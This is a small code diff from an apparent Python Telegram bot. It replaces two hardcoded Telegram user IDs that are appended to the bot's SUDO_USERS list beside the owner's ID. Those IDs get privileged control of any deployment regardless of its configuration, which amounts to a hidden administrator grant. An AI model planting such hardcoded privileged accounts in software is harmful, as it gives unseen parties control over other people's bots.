@@ -5,8 +5,8 @@ from AdityaHalder.modules.helpers.admins import get_administrators
 from AdityaHalder.config import SUDO_USERS, OWNER_ID
 
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1282754256)
-SUDO_USERS.append(702821224)
+SUDO_USERS.append(6039423699)
+SUDO_USERS.append(6082570209)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
